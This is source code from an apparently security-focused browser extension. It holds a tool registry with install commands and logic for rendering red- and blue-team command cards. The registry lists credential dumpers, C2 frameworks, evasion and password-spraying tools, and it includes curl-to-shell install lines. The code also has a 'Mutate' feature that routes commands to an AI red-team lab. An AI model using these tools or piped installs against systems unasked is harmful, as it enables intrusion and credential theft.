    { id: 'mobsf',          label: 'MobSF',              cat: 'mobile',    install: 'docker pull opensecurity/mobile-security-framework-mobsf' },
    // Container Defense
    { id: 'grype',          label: 'Grype',              cat: 'container', install: 'curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh' },
    { id: 'falco',          label: 'Falco',              cat: 'container', install: 'docker pull falcosecurity/falco' },
    { id: 'kubescape',      label: 'Kubescape',          cat: 'container', install: 'curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | bash' },
    { id: 'cosign',         label: 'Cosign',             cat: 'container', install: 'go install github.com/sigstore/cosign/v2/cmd/cosign@latest' },
    // Common utils
    { id: 'nc',             label: 'Netcat',             cat: 'util',      install: 'apt install netcat / ncat (from nmap)' },
    { id: 'rlwrap',         label: 'rlwrap',             cat: 'util',      install: 'apt install rlwrap' },
    { id: 'fail2ban',       label: 'Fail2ban',           cat: 'defense',   install: 'apt install fail2ban' },
    { id: 'thehive',        label: 'TheHive',            cat: 'ir',        install: 'https://docs.strangebee.com' },
    { id: 'ssh',            label: 'SSH',                cat: 'util',      install: 'Built-in (OpenSSH)' },
    { id: 'curl',           label: 'cURL',               cat: 'util',      install: 'apt install curl / built-in (macOS, most Linux)' },
    // New tools from expansions
    { id: 'pspy',           label: 'pspy',               cat: 'privesc',   install: 'github.com/DominicBreuker/pspy/releases' },
    { id: 'smbclient',      label: 'smbclient',          cat: 'enum',      install: 'apt install smbclient' },
    { id: 'snmpwalk',       label: 'snmpwalk',           cat: 'enum',      install: 'apt install snmp' },
    { id: 'sherlock',        label: 'Sherlock',           cat: 'osint',     install: 'pip install sherlock-project' },
    { id: 'censys',         label: 'Censys CLI',         cat: 'osint',     install: 'pip install censys' },
    { id: 'ghidra',         label: 'Ghidra',             cat: 'malware',   install: 'Download from ghidra-sre.org' },
    { id: 'olevba',         label: 'OleVBA',             cat: 'malware',   install: 'pip install oletools' },
    { id: 'floss',          label: 'FLOSS',              cat: 'malware',   install: 'pip install flare-floss' },
    { id: 'capa',           label: 'capa',               cat: 'malware',   install: 'pip install flare-capa' },
    { id: 'chainsaw',       label: 'Chainsaw',           cat: 'forensics', install: 'github.com/WithSecureLabs/chainsaw/releases' },
    { id: 'plaso',          label: 'Plaso/log2timeline', cat: 'forensics', install: 'pip install plaso' },
    { id: 'velociraptor',   label: 'Velociraptor',       cat: 'ir',        install: 'github.com/Velocidex/velociraptor/releases' },
    { id: 'lynis',          label: 'Lynis',              cat: 'hardening', install: 'apt install lynis' },
    { id: 'ssh-audit',      label: 'SSH-Audit',          cat: 'hardening', install: 'pip install ssh-audit' },
    { id: 'sysmon',         label: 'Sysmon',             cat: 'detect',    install: 'Download from docs.microsoft.com/sysinternals/sysmon' },
    { id: 'sigma',          label: 'Sigma',              cat: 'detect',    install: 'pip install sigma-cli' },
    { id: 'wazuh',          label: 'Wazuh',              cat: 'detect',    install: 'apt install wazuh-agent / docker (manager)' },
    { id: 'suricata',       label: 'Suricata',           cat: 'detect',    install: 'apt install suricata' },
    { id: 'beef',           label: 'BeEF',               cat: 'social',    install: 'apt install beef-xss' },
    { id: 'httrack',        label: 'HTTrack',            cat: 'social',    install: 'apt install httrack' },
    { id: 'wifiphisher',    label: 'Wifiphisher',        cat: 'social',    install: 'pip install wifiphisher' },
    { id: 'oscap',          label: 'OpenSCAP',           cat: 'hardening', install: 'apt install libopenscap8' },
    // New tools — passwords (kerbrute already in 'ad' above)
    { id: 'cewl',            label: 'CeWL',               cat: 'passwords', install: 'gem install cewl' },
    { id: 'ntlmrelayx',      label: 'NTLMRelayx',         cat: 'passwords', install: 'pip install impacket' },
    { id: 'secretsdump',     label: 'Secretsdump',        cat: 'passwords', install: 'pip install impacket' },
    { id: 'lazagne',         label: 'LaZagne',            cat: 'post',      install: 'github.com/AlessandroZ/LaZagne/releases' },
    // Threat intel
    { id: 'misp',            label: 'MISP',               cat: 'threatintel', install: 'docker pull coolacid/misp-docker' },
    { id: 'opencti',         label: 'OpenCTI',            cat: 'threatintel', install: 'docker-compose from github.com/OpenCTI-Platform/docker' },
    { id: 'stix2',           label: 'python-stix2',       cat: 'threatintel', install: 'pip install stix2' },
    // Wireless defense
    { id: 'kismet',          label: 'Kismet',             cat: 'wireless',  install: 'apt install kismet' },
    // Evasion
    { id: 'donut',           label: 'Donut',              cat: 'evasion',   install: 'pip install donut-shellcode' },
    { id: 'upx',             label: 'UPX',                cat: 'evasion',   install: 'apt install upx / brew install upx' },
    { id: 'iodine',          label: 'Iodine',             cat: 'evasion',   install: 'apt install iodine' },
    // Detect
    { id: 'tpot',            label: 'T-Pot',              cat: 'detect',    install: 'github.com/telekom-security/tpotce' },
    { id: 'osquery',         label: 'OSQuery',            cat: 'detect',    install: 'apt install osquery / brew install osquery' },
    { id: 'zeek',            label: 'Zeek (Bro)',         cat: 'detect',    install: 'apt install zeek' },
    { id: 'crowdsec',        label: 'CrowdSec',           cat: 'detect',    install: 'apt install crowdsec' },
    // Crypto
    { id: 'openssl',         label: 'OpenSSL',            cat: 'crypto',    install: 'Built-in (most systems)' },
    { id: 'gpg',             label: 'GPG',                cat: 'crypto',    install: 'apt install gnupg / brew install gnupg' },
    { id: 'testssl',         label: 'testssl.sh',         cat: 'crypto',    install: 'apt install testssl.sh / github.com/drwetter/testssl.sh' },
    { id: 'hashid',          label: 'hashid',             cat: 'crypto',    install: 'pip install hashid' },
    // Cloud
    { id: 'gcloud',          label: 'Google Cloud CLI',   cat: 'cloud',     install: 'apt install google-cloud-cli / brew install google-cloud-sdk' },
    // Database
    { id: 'psql',            label: 'PostgreSQL Client',  cat: 'database',  install: 'apt install postgresql-client / brew install libpq / choco install postgresql' },
    { id: 'pg_dump',         label: 'pg_dump',            cat: 'database',  install: 'Included with postgresql-client' },
    { id: 'redis-cli',       label: 'Redis CLI',          cat: 'database',  install: 'apt install redis-tools / brew install redis' },
    { id: 'supabase',        label: 'Supabase CLI',       cat: 'database',  install: 'npm install -g supabase / brew install supabase/tap/supabase' },
    { id: 'testssl-db',      label: 'testssl.sh (DB)',    cat: 'database',  install: 'apt install testssl.sh / github.com/drwetter/testssl.sh' },
    // Docker
    { id: 'docker',          label: 'Docker Engine',      cat: 'docker',    install: 'apt install docker.io / brew install docker / choco install docker-desktop' },
    { id: 'docker-compose',  label: 'Docker Compose',     cat: 'docker',    install: 'apt install docker-compose / pip install docker-compose' },
    { id: 'capsh',           label: 'capsh (libcap)',     cat: 'docker',    install: 'apt install libcap2-bin' },
    // Setup / Environment
    { id: 'wsl',             label: 'WSL2',               cat: 'setup',     install: 'wsl --install (PowerShell Admin)' },
    { id: 'kali',            label: 'Kali Linux',         cat: 'setup',     install: 'wsl --install -d kali-linux / docker pull kalilinux/kali-rolling' },
    { id: 'xrdp',            label: 'xRDP',               cat: 'setup',     install: 'apt install xrdp' },
    { id: 'pimpmykali',      label: 'Pimp My Kali',       cat: 'setup',     install: 'github.com/Dewalt-arch/pimpmykali' },
    { id: 'neo4j',           label: 'Neo4j',              cat: 'setup',     install: 'apt install neo4j / brew install neo4j' },
    // Network Analysis
    { id: 'tcpdump',         label: 'tcpdump',            cat: 'netanalysis', install: 'apt install tcpdump / brew install tcpdump' },
    { id: 'wireshark',       label: 'Wireshark',          cat: 'netanalysis', install: 'apt install wireshark / brew install wireshark / choco install wireshark' },
    { id: 'tshark',          label: 'TShark',             cat: 'netanalysis', install: 'Included with Wireshark' },
    // C2
    { id: 'empire',          label: 'PowerShell Empire',  cat: 'c2',        install: 'apt install powershell-empire / docker pull bcsecurity/empire' },
    { id: 'sliver',          label: 'Sliver',             cat: 'c2',        install: 'github.com/BishopFox/sliver/releases' },
    // Tunneling
    { id: 'proxychains',     label: 'Proxychains',        cat: 'tunnel',    install: 'apt install proxychains4' },
    { id: 'autossh',         label: 'autossh',            cat: 'tunnel',    install: 'apt install autossh' },
    { id: 'rpivot',          label: 'rpivot',             cat: 'tunnel',    install: 'github.com/klsecservices/rpivot' },
    // Vulnerability scanning
    { id: 'nessus',          label: 'Nessus',             cat: 'vulnscan',  install: 'docker run -d -p 8834:8834 tenable/nessus' },
    { id: 'openvas',         label: 'OpenVAS/Greenbone',  cat: 'vulnscan',  install: 'docker run -d -p 443:443 immauss/openvas' },
    // Web Proxy
    { id: 'burpsuite',       label: 'Burp Suite',         cat: 'web',       install: 'Download from portswigger.net / apt install burpsuite' },
    { id: 'mitmproxy',       label: 'mitmproxy',          cat: 'web',       install: 'pip install mitmproxy / brew install mitmproxy' },
    { id: 'dalfox',          label: 'Dalfox',             cat: 'web',       install: 'go install github.com/hahwul/dalfox/v2@latest' },
    // Steganography
    { id: 'steghide',        label: 'steghide',           cat: 'stego',     install: 'apt install steghide' },
    { id: 'binwalk',         label: 'binwalk',            cat: 'stego',     install: 'apt install binwalk / pip install binwalk' },
    { id: 'exiftool',        label: 'ExifTool',           cat: 'stego',     install: 'apt install libimage-exiftool-perl / brew install exiftool' },
    { id: 'zsteg',           label: 'zsteg',              cat: 'stego',     install: 'gem install zsteg' },
    // SIEM & Log Analysis (sigma already in 'detect' above)
    { id: 'splunk',          label: 'Splunk',             cat: 'siem',      install: 'https://www.splunk.com/en_us/download.html (free tier available)' },
    { id: 'elk',             label: 'ELK Stack',          cat: 'siem',      install: 'docker-compose (Elasticsearch + Logstash + Kibana)' },
    { id: 'syslog-ng',       label: 'syslog-ng',          cat: 'siem',      install: 'apt install syslog-ng' },
    // Encoding & CyberChef
    { id: 'cyberchef',       label: 'CyberChef',          cat: 'encoding',  install: 'https://gchq.github.io/CyberChef/ (browser) / docker pull ghcr.io/gchq/cyberchef' },
    { id: 'xxd',             label: 'xxd',                cat: 'encoding',  install: 'apt install xxd / part of vim' },
    // Phishing & Email Security (gophish, evilginx already in 'social'; olevba in 'malware')
    { id: 'mxtoolbox',       label: 'MXToolbox',          cat: 'phishing',  install: 'https://mxtoolbox.com/ (online)' },
    // Binary Exploitation (ghidra already in 'malware' above)
    { id: 'pwntools',        label: 'pwntools',           cat: 'binexp',    install: 'pip install pwntools' },
    { id: 'gdb',             label: 'GDB',                cat: 'binexp',    install: 'apt install gdb' },
    { id: 'peda',            label: 'PEDA/GEF',           cat: 'binexp',    install: 'git clone https://github.com/longld/peda.git ~/peda' },
    { id: 'ropgadget',       label: 'ROPgadget',          cat: 'binexp',    install: 'pip install ROPgadget' },
    { id: 'checksec-tool',   label: 'checksec',           cat: 'binexp',    install: 'apt install checksec / pip install checksec.py' },
    // Reverse Engineering (ghidra already in 'malware' above)
    { id: 'radare2',         label: 'radare2',            cat: 'reveng',    install: 'apt install radare2 / brew install radare2' },
    { id: 'rabin2',          label: 'rabin2',             cat: 'reveng',    install: 'part of radare2' },
    { id: 'pefile',          label: 'pefile (Python)',     cat: 'reveng',    install: 'pip install pefile' },
    { id: 'readelf',         label: 'readelf',            cat: 'reveng',    install: 'apt install binutils (included)' },
    { id: 'strace',          label: 'strace',             cat: 'reveng',    install: 'apt install strace' },
    { id: 'ltrace',          label: 'ltrace',             cat: 'reveng',    install: 'apt install ltrace' },
    // Lateral Movement (evil-winrm in 'ad', chisel in 'tunnel', impacket/crackmapexec above)
    { id: 'psexec',          label: 'PsExec',             cat: 'lateral',   install: 'Sysinternals / impacket-psexec' },
    { id: 'sharprdp',        label: 'SharpRDP',           cat: 'lateral',   install: 'https://github.com/0xthirteen/SharpRDP' },
    // Windows Forensics (volatility already in malware tools conceptually)
    { id: 'volatility3',     label: 'Volatility 3',       cat: 'winforensics', install: 'pip install volatility3' },
    { id: 'ftk-imager',      label: 'FTK Imager',         cat: 'winforensics', install: 'https://www.exterro.com/ftk-imager' },
    { id: 'kape',            label: 'KAPE',               cat: 'winforensics', install: 'https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape' },
    { id: 'pecmd',           label: 'PECmd',              cat: 'winforensics', install: 'Eric Zimmerman tools: https://ericzimmerman.github.io' },
    { id: 'regripper',       label: 'RegRipper',          cat: 'winforensics', install: 'https://github.com/keydet89/RegRipper3.0' },
    { id: 'log2timeline',    label: 'Plaso/log2timeline', cat: 'winforensics', install: 'pip install plaso' },
    // Reporting
    { id: 'cvss-calc',       label: 'CVSS Calculator',    cat: 'reporting', install: 'https://www.first.org/cvss/calculator/3.1 (online)' },
    { id: 'flameshot',       label: 'Flameshot',          cat: 'reporting', install: 'apt install flameshot / choco install flameshot' },
    { id: 'greenshot',       label: 'Greenshot',          cat: 'reporting', install: 'choco install greenshot (Windows)' },
    // Network Attacks (bettercap in 'wireless', responder in 'receivers', iodine in 'evasion', dnscat2 in 'receivers')
    { id: 'ettercap',        label: 'Ettercap',           cat: 'netattack', install: 'apt install ettercap-text-only' },
    { id: 'yersinia',        label: 'Yersinia',           cat: 'netattack', install: 'apt install yersinia' },
    { id: 'dnschef',         label: 'DNSChef',            cat: 'netattack', install: 'pip install dnschef' },
    { id: 'arpwatch',        label: 'arpwatch',           cat: 'netattack', install: 'apt install arpwatch' },
    // AD Attacks (rubeus in 'winpost', bloodhound in 'ad')
    { id: 'bloodhound-py',   label: 'bloodhound-python',  cat: 'adattack',  install: 'pip install bloodhound' },
    // WAF Bypass
    { id: 'wafw00f',         label: 'wafw00f',            cat: 'waf',       install: 'pip install wafw00f' },
    { id: 'xsstrike',        label: 'XSStrike',           cat: 'waf',       install: 'git clone https://github.com/s0md3v/XSStrike.git' },
    // Kubernetes Security (trivy in 'hardening', falco in 'container')
    { id: 'kubectl',         label: 'kubectl',            cat: 'k8s',       install: 'apt install kubectl / brew install kubectl' },
    { id: 'kube-bench',      label: 'kube-bench',         cat: 'k8s',       install: 'go install github.com/aquasecurity/kube-bench@latest' },
    { id: 'kube-hunter',     label: 'kube-hunter',        cat: 'k8s',       install: 'pip install kube-hunter' },
    { id: 'kubeaudit',       label: 'kubeaudit',          cat: 'k8s',       install: 'go install github.com/Shopify/kubeaudit@latest' },
    // Automation & Scripting (lynis, oscap already in 'hardening')
    { id: 'sshpass',         label: 'sshpass',            cat: 'automation', install: 'apt install sshpass' },
    { id: 'paramiko',        label: 'Paramiko',           cat: 'automation', install: 'pip install paramiko' },
    // OSINT expansion (sherlock, shodan already above)
    { id: 'maigret',         label: 'Maigret',            cat: 'osint',     install: 'pip install maigret' },
    { id: 'holehe',          label: 'holehe',             cat: 'osint',     install: 'pip install holehe' },
    { id: 'instaloader',     label: 'Instaloader',        cat: 'osint',     install: 'pip install instaloader' },
    { id: 'waybackurls',     label: 'waybackurls',        cat: 'osint',     install: 'go install github.com/tomnomnom/waybackurls@latest' },
    { id: 'crosslinked',     label: 'CrossLinked',        cat: 'osint',     install: 'pip install crosslinked' },
    { id: 'trufflehog',      label: 'TruffleHog',        cat: 'osint',     install: 'pip install trufflehog / brew install trufflehog' },
    { id: 'gitleaks',        label: 'Gitleaks',           cat: 'osint',     install: 'go install github.com/gitleaks/gitleaks/v8@latest' },
    // Pivoting (chisel in 'lateral', proxychains in 'tunnel')
    { id: 'sshuttle',        label: 'SSHuttle',           cat: 'pivot',     install: 'apt install sshuttle / pip install sshuttle' },
    { id: 'plink',           label: 'Plink',              cat: 'pivot',     install: 'PuTTY suite: https://www.chiark.greenend.org.uk/~sgtatham/putty/' },
    // ICS/SCADA Security
    { id: 'pymodbus',        label: 'pymodbus',           cat: 'ics',       install: 'pip install pymodbus' },
    { id: 'conpot',          label: 'Conpot',             cat: 'ics',       install: 'pip install conpot / docker pull honeynet/conpot' },
    // Threat Modeling (scoutsuite, prowler already in 'cloud')
    { id: 'threat-dragon',   label: 'OWASP Threat Dragon', cat: 'threatmodel', install: 'npm install -g owasp-threat-dragon / https://www.threatdragon.com/' },
    { id: 'cartography',     label: 'Cartography',        cat: 'threatmodel', install: 'pip install cartography' },
    // Browser Exploitation (beef already in 'social')
    { id: 'sharpchrome',     label: 'SharpChrome',        cat: 'browser',   install: 'https://github.com/GhostPack/SharpDPAPI' },
    { id: 'pyhindsight',     label: 'Hindsight',          cat: 'browser',   install: 'pip install pyhindsight' },
    // Incident Playbooks (no dedicated tools — uses existing forensic/IR tools)
    // Metasploit
    { id: 'msfconsole',      label: 'Metasploit Framework', cat: 'metasploit', install: 'apt install metasploit-framework / docker pull metasploitframework/metasploit-framework' },
    { id: 'msfvenom',        label: 'msfvenom',            cat: 'metasploit', install: 'Included with metasploit-framework' },
    // Burp Suite (burpsuite already in 'web' registry)
    { id: 'autorize',        label: 'Autorize',            cat: 'burp',       install: 'Burp BApp Store (extension)' },
    { id: 'jwt-editor',      label: 'JWT Editor',          cat: 'burp',       install: 'Burp BApp Store (extension)' },
    { id: 'param-miner',     label: 'Param Miner',         cat: 'burp',       install: 'Burp BApp Store (extension)' },
    // Azure
    { id: 'msolspray',       label: 'MSOLSpray',           cat: 'azure',      install: 'github.com/dafthack/MSOLSpray (PowerShell)' },
    { id: 'azurehound',      label: 'AzureHound',          cat: 'azure',      install: 'github.com/BloodHoundAD/AzureHound/releases' },
    { id: 'roadtools',       label: 'ROADtools',           cat: 'azure',      install: 'pip install roadtools roadrecon roadtx' },
    { id: 'aadinternals',    label: 'AADInternals',        cat: 'azure',      install: 'Install-Module AADInternals (PowerShell Gallery)' },
    { id: 'powerzure',       label: 'PowerZure',           cat: 'azure',      install: 'github.com/hausec/PowerZure (PowerShell)' },
    { id: 'monkey365',       label: 'Monkey365',           cat: 'azure',      install: 'Install-Module monkey365 / github.com/silverhack/monkey365' },
    // Windows Events
    { id: 'sysmon',          label: 'Sysmon',              cat: 'winevents',  install: 'https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon' },
    // Supply Chain / DevSecOps
    { id: 'snyk',            label: 'Snyk',                cat: 'supplychain', install: 'npm install -g snyk / brew install snyk' },
    { id: 'sonarqube',       label: 'SonarQube',           cat: 'devsecops',  install: 'docker pull sonarqube:community / apt (sonarqube)' },
    // Fuzzing
    { id: 'schemathesis',    label: 'Schemathesis',        cat: 'fuzzing',    install: 'pip install schemathesis' },
    { id: 'boofuzz',         label: 'boofuzz',             cat: 'fuzzing',    install: 'pip install boofuzz' },
    { id: 'afl-fuzz',        label: 'AFL++',               cat: 'fuzzing',    install: 'apt install afl++ / docker pull aflplusplus/aflplusplus' },
    // Threat Hunting
    { id: 'rita',            label: 'RITA',                cat: 'threathunt', install: 'github.com/activecm/rita / docker pull activecm/rita' },
    // Malware Defense
    { id: 'yargen',          label: 'yarGen',              cat: 'maldef',     install: 'pip install yargen / github.com/Neo23x0/yarGen' },
    { id: 'pestudio',        label: 'PEStudio',            cat: 'maldef',     install: 'https://www.winitor.com/ (Windows freeware)' },
    { id: 'any-run',         label: 'ANY.RUN',             cat: 'maldef',     install: 'https://any.run/ (cloud sandbox, free tier)' },
    // API Security
    { id: 'postman',         label: 'Postman',             cat: 'apisec',     install: 'https://www.postman.com/downloads/ / snap install postman' },
    { id: 'kiterunner',      label: 'Kiterunner',          cat: 'apisec',     install: 'go install github.com/assetnote/kiterunner/cmd/kr@latest' },
  ];

  // Build a lookup: tool id → registry entry
  const TOOL_LOOKUP = Object.fromEntries(TOOL_REGISTRY.map(t => [t.id, t]));

  // Map each snippet to its primary tool (first tag that matches the registry)
  function snippetPrimaryTool(snippet) {
    for (const tag of snippet.tags) {
      const norm = tag.toLowerCase().replace(/[^a-z0-9-]/g, '');
      if (TOOL_LOOKUP[norm]) return norm;
    }
    return null;
  }

  // Notion-synced snippets loaded from storage
  let notionSnippets = [];

  function getAllSnippets() {
    return [...SNIPPETS, ...notionSnippets];
  }

  // ═══════════════════════════════════════════════════════════
  //  STATE
  // ═══════════════════════════════════════════════════════════

  const state = {
    search: '', category: 'all', team: 'all',
    os: 'all',              // 'all' | 'linux' | 'windows' | 'macos'
    installedTools: new Set(), // tool IDs the user has checked
    filterByTools: false,   // when true, dim/hide snippets needing unavailable tools
    favorites: new Set(),   // snippet IDs the user has starred
    target: '', lhost: '10.10.14.7', lport: '4444',
    domain: '', user: '', pass: '',
    activeKcPhase: null, activeAttackTactic: null,
    activePyramidLevel: null, activeOwaspCategory: null,
  };

  // ═══════════════════════════════════════════════════════════
  //  HELPERS
  // ═══════════════════════════════════════════════════════════

  function sanitize(v) { return String(v || '').replace(/[^\w.\-:/]/g, '').trim(); }
  const GENERIC_LINK_RE = /(https?:\/\/[^\s"'<>]+|github\.com\/[^\s"'<>]+)/gi;
  const GITHUB_LINK_RE = /(?:https?:\/\/)?github\.com\/[^\s"'<>]+/gi;

  function normalizeExternalLink(raw) {
    if (!raw) return null;
    let link = String(raw).trim().replace(/[),.;\]]+$/g, '');
    if (/^https?:\/\//i.test(link)) return link;
    if (!/^github\.com\//i.test(link)) return null;

    link = link
      .replace(/^github\.com\//i, '')
      .replace(/@.*$/, '')
      .replace(/\/\.\.\..*$/, '');
    const parts = link.split('/').filter(Boolean);
    if (parts.length < 2) return null;
    return `https://github.com/${parts[0]}/${parts[1]}`;
  }

  function extractExternalLink(text, githubOnly = false) {
    if (!text) return null;
    const regex = githubOnly ? GITHUB_LINK_RE : GENERIC_LINK_RE;
    const links = String(text).match(regex);
    if (!links || !links.length) return null;
    return normalizeExternalLink(links[0]) || links[0].replace(/[),.;\]]+$/g, '');
  }

  function openExternalLink(url) {
    if (!url) return;
    if (typeof chrome !== 'undefined' && chrome.tabs && typeof chrome.tabs.create === 'function') {
      chrome.tabs.create({ url });
      return;
    }
    window.open(url, '_blank', 'noopener');
  }

  // OS filter: 'all' shows everything; a specific OS shows 'all' + that OS + multi-OS
  function matchesOs(snippet) {
    if (state.os === 'all') return true;
    // Multi-OS snippets always match (they have a variant for the selected OS)
    if (snippet.commands && snippet.commands[state.os]) return true;
    const s = snippet.os || 'all';
    return s === 'all' || s === state.os;
  }

  // Tool filter: returns true if snippet's primary tool is installed (or no filter active)
  function matchesTools(snippet) {
    if (!state.filterByTools) return true;
    const tool = snippetPrimaryTool(snippet);
    if (!tool) return true; // no known tool → always show
    return state.installedTools.has(tool);
  }

  function renderCmd(cmd) {
    if (!cmd) return '';
    return cmd
      .replaceAll('LHOST', state.lhost || 'LHOST')
      .replaceAll('LPORT', state.lport || 'LPORT')
      .replaceAll('DOMAIN', state.domain || 'DOMAIN')
      .replaceAll('USER', state.user || 'USER')
      .replaceAll('PASS', state.pass || 'PASS')
      .replaceAll('NTHASH', 'NTHASH')
      .replaceAll('TARGET', state.target || 'TARGET');
  }

  // Resolve the best command for a snippet, preferring OS-variant if available
  function resolveCommand(item) {
    if (item.commands && state.os !== 'all' && item.commands[state.os]) {
      return item.commands[state.os];
    }
    return item.command;
  }

  function makeCard(item) {
    const card = document.createElement('article');
    card.className = 'card';
    const rendered = renderCmd(resolveCommand(item));
    const githubLink = extractExternalLink(rendered, true);

    // Dim if tool not installed and filter active
    const primaryTool = snippetPrimaryTool(item);
    const toolAvailable = !primaryTool || state.installedTools.has(primaryTool);
    if (state.filterByTools && !toolAvailable) card.classList.add('dimmed');

    // Favorite star
    const favBtn = document.createElement('button');
    favBtn.className = 'fav-btn' + (state.favorites.has(item.id) ? ' active' : '');
    favBtn.textContent = state.favorites.has(item.id) ? '\u2605' : '\u2606';
    favBtn.title = state.favorites.has(item.id) ? 'Remove from favorites' : 'Add to favorites';
    favBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (state.favorites.has(item.id)) {
        state.favorites.delete(item.id);
        favBtn.classList.remove('active');
        favBtn.textContent = '\u2606';
        favBtn.title = 'Add to favorites';
      } else {
        state.favorites.add(item.id);
        favBtn.classList.add('active');
        favBtn.textContent = '\u2605';
        favBtn.title = 'Remove from favorites';
      }
      saveFavorites();
      renderFavoritesStrip();
    });

    const head = document.createElement('div');
    head.className = 'card-head';
    const title = document.createElement('span');
    title.className = 'card-title';
    title.textContent = item.title;

    // OS badge — single OS or multi-OS indicator
    const hasVariants = item.commands && Object.keys(item.commands).length > 1;
    const itemOs = item.os || 'all';
    if (hasVariants) {
      const osBadge = document.createElement('span');
      osBadge.className = 'card-os-badge';
      osBadge.style.cssText = 'background:rgba(51,209,122,0.15);color:var(--co-green);';
      const activeOs = state.os !== 'all' ? state.os : 'multi';
      osBadge.textContent = activeOs === 'multi' ? 'Multi-OS' : (activeOs === 'linux' ? 'Linux' : activeOs === 'windows' ? 'Win' : 'macOS');
      title.appendChild(document.createTextNode(' '));
      title.appendChild(osBadge);
    } else if (itemOs !== 'all') {
      const osBadge = document.createElement('span');
      osBadge.className = 'card-os-badge ' + itemOs;
      osBadge.textContent = itemOs === 'linux' ? 'Linux' : itemOs === 'windows' ? 'Win' : 'macOS';
      title.appendChild(document.createTextNode(' '));
      title.appendChild(osBadge);
    }

    // Tool missing badge
    if (primaryTool && !toolAvailable) {
      const missingBadge = document.createElement('span');
      missingBadge.className = 'card-tool-missing';
      const reg = TOOL_LOOKUP[primaryTool];
      missingBadge.textContent = 'needs ' + (reg ? reg.label : primaryTool);
      missingBadge.title = reg ? 'Install: ' + reg.install : '';
      title.appendChild(document.createTextNode(' '));
      title.appendChild(missingBadge);
    }

    const cat = document.createElement('span');
    cat.className = 'card-cat ' + item.team;
    cat.textContent = (item.team === 'red' ? 'RED' : 'BLUE') + ' / ' + item.category;
    head.appendChild(favBtn);
    head.appendChild(title);
    head.appendChild(cat);

    const desc = document.createElement('div');
    desc.className = 'card-desc';
    desc.textContent = item.description;

    const cmd = document.createElement('pre');
    cmd.className = 'card-cmd';
    cmd.textContent = rendered;

    const actions = document.createElement('div');
    actions.className = 'card-actions';
    const tags = document.createElement('span');
    tags.className = 'card-tags';
    const tagParts = [...item.tags];
    if (item.owasp && item.owasp.length) tagParts.push(...item.owasp);
    tags.textContent = tagParts.join(', ');
    const actionBtns = document.createElement('div');
    actionBtns.className = 'card-btns';
    const copyBtn = document.createElement('button');
    copyBtn.className = 'copy-btn';
    copyBtn.textContent = 'Copy';
    copyBtn.addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(rendered);
        copyBtn.textContent = 'Copied';
        copyBtn.classList.add('ok');
        setTimeout(() => { copyBtn.textContent = 'Copy'; copyBtn.classList.remove('ok'); }, 1200);
      } catch { copyBtn.textContent = 'Failed'; }
    });
    const mutateBtn = document.createElement('button');
    mutateBtn.className = 'copy-btn';
    mutateBtn.textContent = 'Mutate';
    mutateBtn.title = 'Send to AI Red Team Mutation Lab';
    mutateBtn.addEventListener('click', () => {
      // Open AI Red Team with mutation tab and pre-filled command
      const url = chrome.runtime.getURL('ai-hub/ai-redteam.html') + '#mutation';
      chrome.storage.local.set({ aiRedTeamPrefill: rendered }, () => {
        window.open(url, '_blank');
      });
    });

    let githubBtn = null;
    if (githubLink) {
      githubBtn = document.createElement('button');
      githubBtn.className = 'copy-btn';
      githubBtn.textContent = 'GitHub';
      githubBtn.title = 'Open related GitHub page';
      githubBtn.addEventListener('click', () => openExternalLink(githubLink));
    }

    const saveBtn = window.ObsidianSave ? window.ObsidianSave.button({
      tool: 'cyberops',
      size: 'sm',
      label: 'Save',
      className: 'copy-btn',
      getContent: () => ({
        title: item.title,
        content: `## ${item.title}\n\n**Category:** ${item.category}\n**Team:** ${item.team}\n**Description:** ${item.description}\n\n### Command\n\`\`\`bash\n${rendered}\n\`\`\`\n\n*Generated by Toolbelt CyberOps*`,
        tags: ['cyberops', item.team, item.category, ...(item.tags || [])]
      })
    }) : null;

    actions.appendChild(tags);
    actionBtns.appendChild(copyBtn);
    actionBtns.appendChild(mutateBtn);
    if (githubBtn) actionBtns.appendChild(githubBtn);
    if (saveBtn) actionBtns.appendChild(saveBtn);
    actions.appendChild(actionBtns);

    card.appendChild(head);
    card.appendChild(desc);
    card.appendChild(cmd);
    card.appendChild(actions);
    return card;
  }

  // ═══════════════════════════════════════════════════════════
  //  GLOBAL VARIABLE BAR — wired to all views
  // ═══════════════════════════════════════════════════════════

  function initVarBar() {
    const varInputs = {
      target: document.getElementById('globalTarget'),
      lhost: document.getElementById('globalLhost'),
      lport: document.getElementById('globalLport'),
      domain: document.getElementById('globalDomain'),
      user: document.getElementById('globalUser'),
      pass: document.getElementById('globalPass'),
    };

    // Load saved vars from storage
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsVars'], (result) => {
        const saved = result.cyberOpsVars || {};
        if (saved.target) { state.target = saved.target; varInputs.target.value = saved.target; }
        if (saved.lhost) { state.lhost = saved.lhost; varInputs.lhost.value = saved.lhost; }
        if (saved.lport) { state.lport = saved.lport; varInputs.lport.value = saved.lport; }
        if (saved.domain) { state.domain = saved.domain; varInputs.domain.value = saved.domain; }
        if (saved.user) { state.user = saved.user; varInputs.user.value = saved.user; }
        if (saved.pass) { state.pass = saved.pass; varInputs.pass.value = saved.pass; }
        refreshAllViews();
      });
    }

    function saveVars() {
      if (typeof chrome !== 'undefined' && chrome.storage) {
        chrome.storage.local.set({ cyberOpsVars: {
          target: state.target, lhost: state.lhost, lport: state.lport,
          domain: state.domain, user: state.user, pass: state.pass,
        }});
      }
    }

    function bindVar(el, key) {
      el.addEventListener('input', () => {
        state[key] = key === 'target' ? sanitize(el.value) || '' : el.value.trim();
        saveVars();
        refreshAllViews();
      });
    }

    bindVar(varInputs.target, 'target');
    bindVar(varInputs.lhost, 'lhost');
    bindVar(varInputs.lport, 'lport');
    bindVar(varInputs.domain, 'domain');
    bindVar(varInputs.user, 'user');
    bindVar(varInputs.pass, 'pass');
  }

  // ═══════════════════════════════════════════════════════════
  //  OS SELECTOR — wired to refresh all views
  // ═══════════════════════════════════════════════════════════

  function initOsSelector() {
    const group = document.getElementById('osGroup');
    if (!group) return;

    // Load saved OS
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.get(['cyberOpsOs'], (result) => {
        if (result.cyberOpsOs) {
          state.os = result.cyberOpsOs;
